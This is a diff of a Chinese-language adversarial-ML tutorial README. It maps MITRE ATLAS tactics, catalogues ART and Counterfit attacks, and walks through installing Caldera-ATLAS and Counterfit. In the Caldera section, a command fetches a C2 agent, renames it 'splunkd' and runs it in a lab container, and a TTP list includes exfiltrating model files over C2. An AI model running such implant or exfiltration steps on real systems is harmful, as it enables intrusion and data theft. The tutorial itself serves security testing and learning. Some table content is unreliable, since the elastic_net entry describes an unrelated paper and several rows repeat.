@@ -1,1350 +1,508 @@
-# AI攻擊手法以及工具整合
-## [Mitre-atlas](https://atlas.mitre.org/)
-基於Mitre框架，[atlas解說影片](https://www.youtube.com/watch?v=3FN9v-y-C-w)
+# Adversarial ML Playbook（對抗式機器學習作戰手冊）
+
+<p align="left">
+  <!-- Meta -->
+  <a href="https://atlas.mitre.org/"><img src="https://img.shields.io/badge/MITRE-ATLAS-0B5CAD?style=for-the-badge"></a>
+  <a href="https://attack.mitre.org/"><img src="https://img.shields.io/badge/MITRE-ATT%26CK-111827?style=for-the-badge"></a>
+  <img src="https://img.shields.io/badge/Category-MLSecOps-6E57E0?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Scope-Red%20Team%20%7C%20Adversarial%20ML-EF4444?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Status-WIP-F59E0B?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Last%20updated-2025--09--12-64748B?style=for-the-badge">
+  <br/>
+
+  <!-- Tools -->
+  <a href="https://github.com/mitre-atlas/caldera-atlas"><img src="https://img.shields.io/badge/Tool-Caldera%20ATLAS-0F172A?style=for-the-badge"></a>
+  <a href="https://github.com/Azure/counterfit/"><img src="https://img.shields.io/badge/Tool-Counterfit-2563EB?style=for-the-badge"></a>
+  <a href="https://github.com/Trusted-AI/adversarial-robustness-toolbox"><img src="https://img.shields.io/badge/Tool-ART-1F2937?style=for-the-badge"></a>
+  <a href="https://github.com/bethgelab/foolbox"><img src="https://img.shields.io/badge/Tool-Foolbox-374151?style=for-the-badge"></a>
+  <a href="https://github.com/mitre/advmlthreatmatrix"><img src="https://img.shields.io/badge/Framework-AdvML%20Threat%20Matrix-334155?style=for-the-badge"></a>
+  <br/>
+
+  <!-- Stacks -->
+  <img src="https://img.shields.io/badge/Frameworks-TF%20%7C%20PyTorch%20%7C%20Sklearn%20%7C%20XGBoost%20%7C%20LightGBM%20%7C%20MXNet-10B981?style=for-the-badge">
+  <img src="https://img.shields.io/badge/Platforms-Kali%20%7C%20Windows%20%7C%20Colab%20%7C%20Docker-14B8A6?style=for-the-badge">
+</p>
+
+---
+>此專案由本人三個月完成
+## 📖 專案簡介
+
+**AI 攻擊手法暨工具整合**是一份把「對抗式機器學習（Adversarial ML）」與「資安紅隊」串起來的實作指南。  
+以 **MITRE ATLAS / ATT&CK** 作為威脅模型與術語基準，整理常見攻擊面（Evasion／Extraction／Poisoning／Inference）與對應工具（Caldera-ATLAS、Counterfit、ART、Foolbox…），並提供可重現的 Demo 與安裝步驟。
+
+> 🎯 目標：協助研究員 / 工程師快速完成 **建置 → 攻擊 → 評估 → 防禦** 的完整流程。
+
+
+---
+
+
+
+## Mitre‑atlas
+
+基於 Mitre 框架，[atlas 解說影片](https://www.youtube.com/watch?v=3FN9v-y-C-w)
+
 ![](https://hackmd.io/_uploads/r1jLVpUJT.png)
 ![image](https://hackmd.io/_uploads/Sy2bz9bBa.png)
 ![image](https://hackmd.io/_uploads/HJX9jcZH6.png)
 
-### Methodology(方法論)
-- **Recon（偵察）**
-  - Base Model Discovery（基礎模型發現）
-  - Serving Infrastructure（服務基礎架構）
-  - Dataset Collection（數據集收集）
-- **Model Vulnerabilities（模型漏洞）**
-  - Evasion（逃避）
-  - Inversion（反轉）
-  - Extraction（提取）
-  - Poisoning（污染）
-  - Membership Inference（成員推斷）
-  - Prompt-Injection（提示注入）
-- **Technical Vulnerabilities（技術漏洞）**
-  - Lack of Authentication（缺乏認證）
-  - Insecure Deserialization（不安全的反序列化）
-  - Lack of Input Validation（缺乏輸入驗證）
-- **Harm and Abuse（傷害與濫用）**
-  - Quality-of-Service Harms（服務質量損害）
-  - Allocation Harms（分配損害）
-  - Inappropriate Use（不當使用）
-  - Stereotyping（成見）
+---
 
-### ML Dev（機器學習開發）
-- **Pre（前期）**
-  - Ideation（概念設計）
-- **Train Time（訓練階段）**
-  - Data Collection（數據收集）
-  - Data Processing（數據處理）
-  - Model Training（模型訓練）
-- **Inference（推論）**
-  - Model Evaluation（模型評估）
-  - Model Deployment（模型部署）
-- **Post（後期）**
-  - System Monitoring（系統監控）
-  - EOL（生命周期終結）
+## Methodology（方法論）
 
-### Tech Stack（技術棧）
-- **Infra（基礎設施）**
-  - Local（本地）
-  - Cloud（雲端）
+> 依攻擊者觀點拆解 ML 目標系統的可利用面與濫用風險。
 
-### 技術工具和平台
-- Jupyter
-- Hugging Face
-- pandas
-- CUDA
-- Torch
-- Spark
-- Accelerate
-- img2dataset
-- Fairlearn
-- Alibi
-- ONNX
-- Triton
-- MLFlow
-- Splunk
-- Prometheus
-- S3
+* **Recon（偵察）**
+
+  * Base Model Discovery（基礎模型發現）
+  * Serving Infrastructure（服務基礎架構）
+  * Dataset Collection（數據集收集）
+* **Model Vulnerabilities（模型漏洞）**
+
+  * Evasion（逃避）
+  * Inversion（反轉）
+  * Extraction（提取）
+  * Poisoning（污染）
+  * Membership Inference（成員推斷）
+  * Prompt‑Injection（提示注入）
+* **Technical Vulnerabilities（技術漏洞）**
+
+  * Lack of Authentication（缺乏認證）
+  * Insecure Deserialization（不安全的反序列化）
+  * Lack of Input Validation（缺乏輸入驗證）
+* **Harm and Abuse（傷害與濫用）**
+
+  * Quality‑of‑Service Harms（服務質量損害）
+  * Allocation Harms（分配損害）
+  * Inappropriate Use（不當使用）
+  * Stereotyping（成見）
+
+---
+
+## ML Dev（機器學習開發）
+
+> 以生命周期視角標註可能的攻擊與防禦切入點。
+
+* **Pre（前期）**
+
+  * Ideation（概念設計）
+* **Train Time（訓練階段）**
+
+  * Data Collection（數據收集）
+  * Data Processing（數據處理）
+  * Model Training（模型訓練）
+* **Inference（推論）**
+
+  * Model Evaluation（模型評估）
+  * Model Deployment（模型部署）
+* **Post（後期）**
+
+  * System Monitoring（系統監控）
+  * EOL（生命周期終結）
+
+---
+
+## Tech Stack（技術棧）
+
+> 執行/部署選項概覽。
+
+* **Infra（基礎設施）**
+
+  * Local（本地）
+  * Cloud（雲端）
+
+---
+
+## 技術工具和平台
+
+Jupyter ｜ Hugging Face ｜ pandas ｜ CUDA ｜ Torch ｜ Spark ｜ Accelerate ｜ img2dataset ｜ Fairlearn ｜ Alibi ｜ ONNX ｜ Triton ｜ MLFlow ｜ Splunk ｜ Prometheus ｜ S3
+
+---
 
 ## Mitre
-**按照Mitre att&ck框架
-分為以下幾個攻擊流程**
-| 戰略名稱 | 說明     | 常見攻擊手法 | 相關工具 |
-| :---     | :---     | :---:        |  :---  |
-|[偵查](https://atlas.mitre.org/tactics/AML.TA0002/)|收集目標的資訊|掃描、搜索受害者公開資料(社交工程)|Nmap|
-|[資源開發](https://atlas.mitre.org/tactics/AML.TA0003/)|準備好需要的各種技術資源|獲取公開模型、工具收集|None|
-|[初期存取](https://atlas.mitre.org/tactics/AML.TA0004/)|摸索入侵途徑的方法|網路釣魚、外部遠端服務等
-|[執行](https://atlas.mitre.org/tactics/AML.TA0000/)|執行惡意程式碼和惡意指令的方式|腳本、用戶執行、元件物件模型
-|[持續性](https://atlas.mitre.org/tactics/AML.TA0006/)|成功入侵系統後，能持續保持|外部遠端服務、啟動或登入自動執行
-|[防禦規避](https://atlas.mitre.org/tactics/AML.TA0007/)|在發動攻擊的同時，繞過系統防禦機制的方法|掃描、搜索受害者公開資料(社交工程)
-|[發現](https://atlas.mitre.org/tactics/AML.TA0008/)|能窺探內部網段及系統環境的方法|獲取公開模型、工具收集
-|[蒐集](https://atlas.mitre.org/tactics/AML.TA0009/)|能盜取敏感資料的方法|腳本、用戶執行、元件物件模型
-|[攻擊階段](https://atlas.mitre.org/tactics/AML.TA0001/)|攻擊者正在利用他們對目標系統的瞭解和訪問來定製攻擊。|Poison ML 模型、製作對抗數據
-|[滲出](https://atlas.mitre.org/tactics/AML.TA0010/)|攜出及外流敏感資訊的方法|藉由ML API進行滲出、網路手段進行滲出
-|[衝擊](https://atlas.mitre.org/tactics/AML.TA0011/)|攻破系統後，對系統造成的危害種類|規避ML、侵蝕NL模型
+
+**按照 Mitre ATT\&CK 框架分為以下攻擊流程**
+
+> 釐清戰術（Tactic）—技術（Technique）—程序（Procedure）的對應，方便在演練或檢測時映射。
+
+| 戰略名稱                                                | 說明              | 常見攻擊手法              | 相關工具 |
+| :-------------------------------------------------- | :-------------- | :------------------ | :--- |
+| [偵查](https://atlas.mitre.org/tactics/AML.TA0002/)   | 收集目標的資訊         | 掃描、搜索受害者公開資料（社交工程）  | Nmap |
+| [資源開發](https://atlas.mitre.org/tactics/AML.TA0003/) | 準備好需要的各種技術資源    | 獲取公開模型、工具收集         | —    |
+| [初期存取](https://atlas.mitre.org/tactics/AML.TA0004/) | 摸索入侵途徑的方法       | 網路釣魚、外部遠端服務等        | —    |
+| [執行](https://atlas.mitre.org/tactics/AML.TA0000/)   | 執行惡意程式碼和惡意指令的方式 | 腳本、用戶執行、元件物件模型      | —    |
+| [持續性](https://atlas.mitre.org/tactics/AML.TA0006/)  | 成功入侵後持續存取       | 外部遠端服務、啟動/登入自動執行    | —    |
+| [防禦規避](https://atlas.mitre.org/tactics/AML.TA0007/) | 繞過防禦機制          | 掃描、社工、公開資料濫用        | —    |
+| [發現](https://atlas.mitre.org/tactics/AML.TA0008/)   | 窺探內部網段與系統環境     | 獲取公開模型、工具收集         | —    |
+| [蒐集](https://atlas.mitre.org/tactics/AML.TA0009/)   | 盜取敏感資料          | 腳本、用戶執行、元件物件模型      | —    |
+| [攻擊階段](https://atlas.mitre.org/tactics/AML.TA0001/) | 依對目標的理解定製攻擊     | Poison ML 模型、製作對抗數據 | —    |
+| [滲出](https://atlas.mitre.org/tactics/AML.TA0010/)   | 外流敏感資訊          | 藉由 ML API 或網路手段進行滲出 | —    |
+| [衝擊](https://atlas.mitre.org/tactics/AML.TA0011/)   | 造成實質危害          | 規避 ML、侵蝕 NL 模型      | —    |
+
+---
+
 ## [Adversarial Machine Learning(對抗式攻擊)](https://atlas.mitre.org/resources/adversarial-ml-101/)
 
-**底下更細分，以下幾種攻擊，並分成訓練中，模型輸出**
+> 依攻擊目標（訓練/推論）與成效（逃避/提取/污染/推論）分類，並附對策或工具實作方向。
 
-| 攻擊手法 		        | 說明	|防禦工具或對策|
-| :---			        | :---      |:----------------|
-| Model Evasion         |Evasion攻擊是最常見也最容易應用的攻擊。深度學習也和傳統機器學習一樣，會讀入一些輸入資料(Input data)，經由深度學習模型和資料間的計算，得出對此筆資料的預測機率值(Probability)或分類(Classification)資訊。而Evasion攻擊就是希望對輸入資料進行非常細微的修改，大幅改變深度學習模型的預測結果。  |boundary、carlini、deepfool、elastic_net、hop_skip_jump、newtonfool、pixel_threshold、projected_gradient_descent_numpy、saliency_map、simba、spatial_transformation、universal_perturbation、virtual_adversarial、wasserstein、a2t_yoo_2021、bae_garg_2019、bert_attack_li_2020、checklist_ribeiro_2020、clare_li_2020、deepwordbug_gao_2018、faster_genetic_algorithm_jia_2019、genetic_algorithm_alzantot_2018、hotflip_ebrahimi_2017、iga_wang_2019、input_reduction_feng_2018、kuleshov_2017、morpheus_tan_2020、pruthi_2019、pso_zang_2020、pwws_ren_2019、seq2sick_cheng_2018_blackbox、textbugger_li_2018、textfooler_jin_2019|
-| Functional Extraction  ed| 攻擊者能夠通過反覆運算查詢模型來恢復功能等效的模型。這允許攻擊者在進一步攻擊在線模型之前檢查模型的離線副本。  |
-| Model Poisoning 	    | 攻擊者污染 ML 系統的訓練數據，以便在推理時獲得所需的結果。通過對訓練數據的影響，攻擊者可以創建「後門」，其中任意輸入將導致特定輸出。該模型可以「重新程式設計」以執行新的不需要的任務。此外，訪問訓練數據將允許攻擊者創建離線模型並創建模型規避。訪問訓練數據也可能導致私有數據洩露。  |
-| Model Inversion 	    | 攻擊者恢復用於訓練模型的特徵。成功的攻擊將導致攻擊者能夠發起成員資格推理攻擊。此攻擊可能導致私有數據洩露。  | copycat_cnn、functionally_equivalent_extraction
-| Traditional Attacks   | 攻擊者使用完善的 TTP 來實現其目標。 | 
-|common-corruption|通常是對數據的一種形式。這種攻擊旨在測試機器學習模型的韌性，尤其是在面對常見的數據變異或噪聲時的表現。這些常見的數據變異可以包括拼寫錯誤、圖像噪聲、文本中的簡單變化等等。|
-Model Inference|使用已經訓練好的機器學習模型來進行預測。這是模型的正常操作，其中模型接收輸入數據，並生成相應的輸出。模型推斷通常是為了解決特定的問題，如圖像分類、語音識別等。|black_box_rule_based、 label_only_boundary_distance、mi_face、white_box_decision_tree
+**底下更細分，以下幾種攻擊，並分成訓練中、模型輸出**
+
+| 攻擊手法                  | 說明                              | 防禦工具或對策                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| :-------------------- | :------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Model Evasion         | Evasion 攻擊對輸入做細微修改，導致模型預測大幅改變。  | boundary、carlini、deepfool、elastic\_net、hop\_skip\_jump、newtonfool、pixel\_threshold、projected\_gradient\_descent\_numpy、saliency\_map、simba、spatial\_transformation、universal\_perturbation、virtual\_adversarial、wasserstein、a2t\_yoo\_2021、bae\_garg\_2019、bert\_attack\_li\_2020、checklist\_ribeiro\_2020、clare\_li\_2020、deepwordbug\_gao\_2018、faster\_genetic\_algorithm\_jia\_2019、genetic\_algorithm\_alzantot\_2018、hotflip\_ebrahimi\_2017、iga\_wang\_2019、input\_reduction\_feng\_2018、kuleshov\_2017、morpheus\_tan\_2020、pruthi\_2019、pso\_zang\_2020、pwws\_ren\_2019、seq2sick\_cheng\_2018\_blackbox、textbugger\_li\_2018、textfooler\_jin\_2019 |
+| Functional Extraction | 攻擊者能通過反覆查詢恢復功能等效的模型，離線檢查再進一步攻擊。 |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| Model Poisoning       | 污染訓練數據以植入後門或重程式化模型；亦可能導致私數據洩露。  |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| Model Inversion       | 復原訓練特徵，可能導致成員推論與隱私外洩。           | copycat\_cnn、functionally\_equivalent\_extraction                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
+| Traditional Attacks   | 使用既有 TTP（傳統資安技術）達成目標。           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| common‑corruption     | 常見數據變異（拼字、噪聲、簡單變化…）測試模型韌性。      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| Model Inference       | 針對既有模型進行推論測試（黑箱/白箱/僅標籤）。        | black\_box\_rule\_based、label\_only\_boundary\_distance、mi\_face、white\_box\_decision\_tree                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+
+---
+
 ## [OpenSource Security Tools](https://github.com/RiccardoBiosas/awesome-MLSecOps)
-工具名稱 | 作業系統 | 介紹 | 做了甚麼尚未解決安裝環境問題
---- | --- | --- | ---
-Caldera-Atlas | Kali | 專注於機器學習模型的安全性分析 | - 建置成功, 成功使用Arsenal插件, 實際應用上覺得不太適合
-Counterfit | Windows | 微軟開發的工具，專注於自動化的對抗性攻擊測試，適合於安全性測試和評估。 | - 建置成功, 展示了一些攻擊方式, 儘管提供了多種攻擊類型，但缺乏文獻和參數資料
-Adversarial Robustness Toolbox (ART) | Colab | 提供全面的對抗性攻擊、防禦和模型魯棒性評估方法 | - 建置成功, 展示了多種攻擊方式, 提供了更多文獻來源, 參數清晰易懂, 在實務中更實用
-Foolbox | Colab | 專注於對抗性攻擊，支持多種深度學習框架 | - 建置成功, 專注於對抗性攻擊
-CleverHans | Colab | 用於對抗性攻擊和防禦的Python庫 | [尚未解決的安裝環境問題]
-SECML | Colab | 用於機器學習的安全性分析和研究 | [尚未解決的安裝環境問題]
 
+| 工具名稱                                 | 作業系統    | 介紹               | 做了甚麼尚未解決安裝環境問題                       |
+| ------------------------------------ | ------- | ---------------- | ------------------------------------ |
+| Caldera-Atlas                        | Kali    | 專注於機器學習模型的安全性分析  | - 建置成功, 成功使用 Arsenal 插件, 實際應用上覺得不太適合 |
+| Counterfit                           | Windows | 微軟自動化對抗測試工具      | - 建置成功, 展示了一些攻擊方式, 文獻與參數略少           |
+| Adversarial Robustness Toolbox (ART) | Colab   | 全面對抗攻擊/防禦與魯棒評估   | - 建置成功, 攻擊多、參考多、參數清晰                 |
+| Foolbox                              | Colab   | 對抗性攻擊工具，支援多框架    | - 建置成功, 聚焦攻擊                         |
+| CleverHans                           | Colab   | 對抗攻擊與防禦 Python 庫 | \[尚未解決的安裝環境問題]                       |
+| SECML                                | Colab   | ML 安全分析研究框架      | \[尚未解決的安裝環境問題]                       |
 
-**工具能用以下幾種**
-- [caldera-atlas](https://github.com/mitre-atlas/caldera-atlas)
-  ```bash
-  #git clone前需要先建立github ssh金鑰
-  $ssh-keygen
-  $cd ~/.ssh
-  $cat ~/.ssh/id_rsa.pub #印出來
-  ```
-  
+---
+
+## 工具能用以下幾種
+
+### [caldera-atlas](https://github.com/mitre-atlas/caldera-atlas)
+
+```bash
+# git clone 前需要先建立 GitHub SSH 金鑰
+$ ssh-keygen
+$ cd ~/.ssh
+$ cat ~/.ssh/id_rsa.pub  # 印出來
+```
+
 ![](https://hackmd.io/_uploads/By8JYnDxp.png)
 
 ![](https://hackmd.io/_uploads/Hku9F3Dxa.png)
 
 ![](https://hackmd.io/_uploads/S15DFhvlT.png)
 
+到[github 金鑰](https://github.com/settings/keys)新增公鑰就好了
 
-    
-    
-到[github金鑰](https://github.com/settings/keys)新增公鑰就好了
-    
 ```bash
-$git clone --recursive git@github.com:mitre-atlas/caldera-atlas.git
-$cd caldera-atlas
-$sudo docker-compose build#沒有的按照指示pip下載就可以了
-$sudo docker-compose up -d
+$ git clone --recursive git@github.com:mitre-atlas/caldera-atlas.git
+$ cd caldera-atlas
+$ sudo docker-compose build  # 沒有的按照指示 pip 下載就可以了
+$ sudo docker-compose up -d
 ```
+
 ![](https://hackmd.io/_uploads/S1sElyOxa.png)
 
-這樣就建完了可以連上https://localhost:8888/
-    帳號密碼admin/admin
+這樣就建完了可以連上 [https://localhost:8888/](https://localhost:8888/)
+帳號密碼 admin/admin
+
 ![](https://hackmd.io/_uploads/HyU5gJ_xa.png)
 
-點選左邊的Agent開始部屬靶機
+點選左邊的 Agent 開始部屬靶機
+
 ![](https://hackmd.io/_uploads/Bkf1o1OlT.png)
+
 ```bash=
-$cd ml-vulhub/envs/example-00-ml-dev
+$ cd ml-vulhub/envs/example-00-ml-dev
 
 # perform build and initialization steps
-$sudo docker-compose build
-$sudo ./init.sh
+$ sudo docker-compose build
+$ sudo ./init.sh
 
-$sudo docker-compose up -d
-$sudo docker-compose exec mldev bash -c 'server=http://host.docker.internal:8888; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download -o splunkd; chmod u+x splunkd; ./splunkd -server $server -group red -v'
+$ sudo docker-compose up -d
+$ sudo docker-compose exec mldev bash -c 'server=http://host.docker.internal:8888; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download -o splunkd; chmod u+x splunkd; ./splunkd -server $server -group red -v'
 ```
-部屬完就可以上面就會顯示Alive
+
+部屬完就可以上面就會顯示 Alive
+
 ![](https://hackmd.io/_uploads/S1XW3kOgT.png)
-選擇左邊的adversaries可以配置一些手法，如圖中我選Discovery
+
+選擇左邊的 adversaries 可以配置一些手法，如圖中我選 Discovery
+
 ![](https://hackmd.io/_uploads/HJ2zC1dlp.png)
-選擇左邊的operations可以倚靠自己新增的手法，去攻擊測試
+
+選擇左邊的 operations 可以倚靠自己新增的手法，去攻擊測試
+
 ![](https://hackmd.io/_uploads/HkKkVlugp.png)
-也可以選擇左邊的插件arsenal中的攻擊手法
+
+也可以選擇左邊的插件 arsenal 中的攻擊手法
+
 ![](https://hackmd.io/_uploads/HJZ58e_lp.png)
 
-Arsenal 裡面的TTPs
-1. Create a staging directory for exfiltration.
-   - 為外洩創建一個暫存目錄。
+**Arsenal 裡面的 TTPs**
 
-2. Discover GPUs present
-   - 檢測當前存在的GPU。
-
-3. Find Tensorflow model checkpoint files with the extension: .ckpt
-   - 查找擁有副檔名為 .ckpt 的Tensorflow模型檔案。
-
-4. Search and Stage Tensorflow model files
-   - 搜尋並準備Tensorflow模型檔案以進行外洩。
-
-5. Install Python
-   - 安裝Python。
-
-6. Download and install Python and it’s dependencies () where the agent is deployed.Python 3.7+
-   - 下載並安裝Python及其相關依賴項（）到代理程式所部署的位置。Python版本需為3.7+。
-
-7. Determine Python3 version
-   - 確認Python3的版本。
-
-8. Determine Python3 is installed and version () where the agent is deployed.Python 3.7+
-   - 確認Python3是否已安裝，並顯示版本（）到代理程式所部署的位置。Python版本需為3.7+。
-
-9. PIP Install Tensorflow-GPU
-   - 使用PIP安裝Tensorflow-GPU。
-
-10. PIP Install Tensorflow-CPU
-    - 使用PIP安裝Tensorflow-CPU。
-
-11. CNN Image Classifier
-    - 使用CNN圖像分類器。
-
-12. Search for images and apply an image classifier
-    - 搜尋圖像並應用圖像分類器。
-
-13. Compress staged directory
-    - 壓縮已準備好的目錄。
-
-14. Compress a directory on the file system
-    - 壓縮檔案系統上的一個目錄。
-
-15. Exfiltrate staged directory over the C2 channel
-    - 透過C2通道外洩已準備好的目錄。
-
-
-- [counterfit](https://github.com/Azure/counterfit/)
-**Microsoft文章 [內文](https://www.microsoft.com/en-us/security/blog/2021/05/03/ai-security-risk-assessment-using-counterfi)Conterfit是一個開源專案，安全測試AI系統的自動化工具，Counterfit 是用於評估機器學習系統安全性的通用自動化層。它將幾個現有的對抗框架放在一個工具下，或者允許用戶創建自己的框架。**
-  - 使用系統 Windows
-  - 需要先安裝 Anaconda Python 和 git。
-  - 打開ps或cmd或是Anaconda shell
-      ```bash
-      $conda update -c conda-forge --all -y
-      ```
-      ![](https://hackmd.io/_uploads/B1FkLwcga.png)
-      
-      ```bash
-      $conda create --yes -n counterfit python=3.8.0
-      $conda activate counterfit
-      ```
-      ![](https://hackmd.io/_uploads/ByKULP9lT.png)
-      ```bash
-      $git clone -b main https://github.com/Azure/counterfit.git
-      ```
-      ![](https://hackmd.io/_uploads/BkkoLv5eT.png)
-      ```bash
-      $cd counterfit
-      $pip install .[dev]
-      $counterfit
-      ```
-      ![](https://hackmd.io/_uploads/rJklJqcep.png)
-      - 使用方式
-      有一些攻擊手段清單 以及目標
-      ```bash
-      $list targets #目標清單
-      $list attacks #攻擊手法清單(類型、分類)
-      $help
-      ```
-      ![](https://hackmd.io/_uploads/rJfOe9clT.png)
-      
-      ![](https://hackmd.io/_uploads/S1H0wo9gT.png)
-      ![](https://hackmd.io/_uploads/rkX3139ep.png)
-      
-    ##  攻擊手段分類
-    ![](https://hackmd.io/_uploads/r1R_eq5lp.png)
-    
-
-    |     名稱          |  階段| 類型|說明 |
-    | ---------------------------------- | ------------------------------- | ---------- | --- |
-    | black_box_rule_based               | inference(推論)                 | 圖片、表格 |     |     |     |     |
-    | label_only_boundary_distance       | inference(推論)                 | 圖片、表格 |這篇論文提出了僅基於模型預測標籤的成員推斷攻擊方法。主要思路是:通過查詢模型對數據樣本及其增強版本的預測標籤,來判斷樣本是否為模型的訓練數據。作者提出了基於數據增強和決策邊界距離的攻擊手法。這種僅需要預測標籤的攻擊,比需要模型置信度向量的現有攻擊更普適,也能達到相當的攻擊效果。論文還指出許多現有防禦方法無法抵禦這種標籤攻擊,需要從減少過擬合等角度進行防禦。     |     |     |     |
-    | mi_face                            | inference(推論)                 | 圖片、表格 |     |     |     |     |
-    | white_box_decision_tree            | inference(推論)                 | unknown    |     |     |     |     |
-    | copycat_cnn                        | inversion(逆向)                 | 圖片       | 這篇論文提出了一種從黑箱模型中提取知識的攻擊方法。主要思路是:使用隨機非標註數據作為輸入,查詢目標模型並獲取其預測標籤,構建假數據集。使用這個假數據集訓練一個模仿模型(copycat model)。實驗表明,模仿模型可以達到與目標模型相當的性能,實現對模型知識的提取。這種黑箱攻擊僅通過查詢接口獲取標籤信息,就可以訓練出與目標模型性能相近的模型,對於保護商業模型的安全性形成威脅。         |     |     |     |
-    | functionally_equivalent_extraction | inversion (逆向)                | 圖片、表格 |這篇論文提出了一種從黑箱模型中直接提取參數的方法,實現功能等價提取。主要思路是:找到模型的關鍵點,每個點對應一個隱層單元。比較相鄰線性區域的差異,復原第一層權重矩陣。通過全局資訊恢復權重正負號。以上取得第一層參數,然後用線性方程組解出第二層。這種攻擊只需要模型的預測標籤,就可以實現幾乎100%恢復參數的效果。儘管有理論困難,但對簡單模型仍具可行性。     |     |     |
-    | boundary                           | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | carlini                            | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | deepfool                           | evasion(規避)                   | 圖片、表格 |這篇論文提出了一種生成對抗 EXAMPLES 的算法 DeepFool,主要思路是:對模型進行線性化近似,計算使模型誤判的最小扰動。迭代更新,逼近使模型誤判的最優解。實驗表明,該算法可以有效地產生模型誤判的小幅度扰動,用於評估模型的鲁棒性。相較於其他對抗攻擊方法,DeepFool 算法計算扰动更準確,也使模型更敏感,可作為评估模型鲁棒性的有效工具。     |     |     |     |
-    | elastic_net                        | evasion(規避)                   | 圖片、表格 |彈性網絡（Elastic Net）正則化擴展到所有廣義線性模型（GLMs）和Cox模型。作者介紹了一種計算高效的算法來實現這一目的。論文還討論了用於評估模型性能的實用函數。彈性網絡正則化結合了L1和L2懲罰項，尤其適用於處理相關特徵。論文詳細說明了實施細節，包括使用FORTRAN進行計算效率和R進行靈活性。該論文特別強調了glmnet R包在處理這些模型方面的能力。
-     |     |     |     |
-    | hop_skip_jump                      | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | newtonfool                         | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | pixel_threshold                    | evasion(規避)                   | 圖片       |     |     |     |     |
-    | projected_gradient_descent_numpy   | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | saliency_map                       | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | simba                              | evasion(規避)                   | 圖片       |     |     |     |     |
-    | spatial_transformation             | evasion(規避)                   | 圖片、表格 |     |     |     |     |
-    | universal_perturbation             | evasion(規避)                   | 圖片       |     |     |     |     |
-    | virtual_adversarial                | evasion(規避)                   | 圖片       |     |     |     |     |
-    | wasserstein                        | evasion(規避)                   | 圖片       |     |     |     |     |
-    | a2t_yoo_2021                       | evasion(規避)                   | 文本       |     |     |     |     |
-    | bae_garg_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | bert_attack_li_2020                | evasion(規避)                   | 文本       |     |     |     |     |
-    | checklist_ribeiro_2020             | evasion(規避)                   | 文本       |     |     |     |     |
-    | clare_li_2020                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | deepwordbug_gao_2018               | evasion(規避)                   | 文本       |     |     |     |     |
-    | faster_genetic_algorithm_jia_2019  | evasion(規避)                   | 文本       |     |     |     |     |
-    | genetic_algorithm_alzantot_2018    | evasion(規避)                   | 文本       |     |     |     |     |
-    | hotflip_ebrahimi_2017              | evasion(規避)                   | 文本       |     |     |     |     |
-    | iga_wang_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | input_reduction_feng_2018          | evasion(規避)                   | 文本       |     |     |     |     |
-    | kuleshov_2017                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | morpheus_tan_2020                  | evasion(規避)                   | 文本       |     |     |     |     |
-    | pruthi_2019                        | evasion(規避)                   | 文本       |     |     |     |     |
-    | pso_zang_2020                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | pwws_ren_2019                      | evasion(規避)                   | 文本       |     |     |     |     |
-    | seq2sick_cheng_2018_blackbox       | evasion(規避)                   | 文本       |     |     |     |     |
-    | textbugger_li_2018                 | evasion(規避)                   | 文本       |     |     |     |     |
-    | textfooler_jin_2019                | evasion(規避)                   | 文本       |     |     |     |     |
-    | ApplyLambda                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Blur                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Brightness                         | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | ChangeAspectRatio                  | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | ClipImageSize                      | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | ColorJitter                        | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Contrast                           | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | ConvertColor                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Crop                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | EncodingQuality                    | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Grayscale                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Crop                               | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | EncodingQuality                    | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Grayscale                          | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | HFlip                              | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | MemeFormat                         | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | Opacity                            | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | OverlayEmoji                       | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | OverlayOntoScreenshot              | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
-    | OverlayStripes                     | common-corruption(常見數據損壞) | 圖片       |     |     |     |     |
